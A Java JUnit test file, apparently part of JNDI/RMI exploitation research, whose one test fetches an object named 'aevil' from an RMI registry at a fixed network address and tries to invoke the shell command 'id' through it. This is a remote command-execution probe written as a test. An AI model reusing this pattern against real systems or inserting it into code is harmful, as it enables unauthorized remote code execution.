import com.server.LdapServer;
import org.junit.Test;

import javax.management.remote.rmi.RMIConnection;
import java.lang.reflect.Method;
import java.net.FileNameMap;
import java.rmi.Naming;
import java.rmi.Remote;

public class TestJndi {
    @Test
    public void testLdapConnection() throws Exception{
        Remote lookup1 = Naming.lookup("rmi://192.168.122.217:14961/aevil");
        RMIConnection lookup = (RMIConnection) lookup1;
        System.out.println(lookup.invoke(null, "id", null, null, null));
    }
}
